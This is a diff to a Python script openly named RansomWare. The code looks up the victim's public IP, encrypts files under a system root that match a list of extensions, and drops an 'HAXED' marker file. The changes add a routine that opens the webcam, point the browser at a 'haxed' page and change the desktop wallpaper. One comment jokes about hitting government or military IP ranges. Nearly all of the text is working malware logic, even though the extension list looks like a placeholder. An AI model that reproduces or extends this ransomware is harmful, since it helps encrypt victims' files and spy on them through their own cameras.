@@ -7,6 +7,7 @@ import ctypes
 import encryptor
 import threading
 import tkinter as tk
+import cv2
 
 
 # File exstensions to seek out and Encrypt
@@ -17,11 +18,10 @@ extensions = [
     'bananas',
 ]
 
+
 class RansomWare:
 
     def __init__(self):
-        self.encryptor = encryptor
-
         self.public_key = None
 
         ''' Root directorys to start Encryption/Decryption from
@@ -35,13 +35,16 @@ class RansomWare:
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
+        print(f"[IP ADDRESS] {self.publicIP}")
+        print(f"[SYS ROOT] {self.sysRoot}")
         self.start_attack()
 
     def start_attack(self):
         try:
-            self.change_desktop_background()
-            self.open_browser()
+            # self.open_browser()
+            self.take_picture()
             self.encryptSystem()
+            self.change_desktop_background()
         except Exception as err:
             print(err)
 
@@ -56,12 +59,25 @@ class RansomWare:
             SPI_SETDESKWALLPAPER, 0, path, 0)
 
     def open_browser(self):
-        webbrowser.open('http://net-informations.com', new=1)
+        webbrowser.open('https://jakeoverall.github.io/haxed', new=1)
 
     def encryptSystem(self):
         if not self.system_encrypted:
-            self.encryptor.encryptDirectory(self.sysRoot, extensions)
-            open(".encrypted", "wb").write("HAXED")
+            encryptor.encryptDirectory(self.sysRoot, extensions)
+            open(".encrypted", "wb").write("HAXED".encode())
+
+    def take_picture(self):
+        try:
+            vid = cv2.VideoCapture(0)
+            while True:
+                ret, frame = vid.read()
+                cv2.imshow('frame', frame)
+                if cv2.waitKey(1) & 0xFF == ord('q'):
+                    break
+            vid.release()
+            cv2.destroyAllWindows()
+        except Exception as err:
+            print(err)
 
     def check_encrypted(self):
         """
@@ -75,7 +91,10 @@ class RansomWare:
 
 
 def main():
-    RansomWare()
+    try:
+        RansomWare()
+    except Exception as err:
+        print(err)
 
 
 if __name__ == '__main__':
